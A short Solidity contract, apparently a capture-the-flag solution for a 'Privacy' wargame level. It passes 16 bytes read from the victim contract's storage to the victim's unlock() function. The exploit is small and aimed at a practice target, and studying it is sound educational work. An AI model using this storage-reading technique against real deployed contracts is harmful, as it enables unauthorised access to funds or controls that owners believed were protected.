pragma solidity 0.8.0;
// using the bytes provided by get_storage.py, take the first 16 bytes and provide it to attack function, which will unlock the contract. 
interface Privacy {
    function unlock(bytes16 _key) external;
}

contract Unlock {
    address owner;
    address vic;
    
    constructor(address _vic) {
        owner = msg.sender;
        vic = _vic;
    
        
    }

    function attack(bytes16 _key) external {
        Privacy(vic).unlock(_key);

    }
}
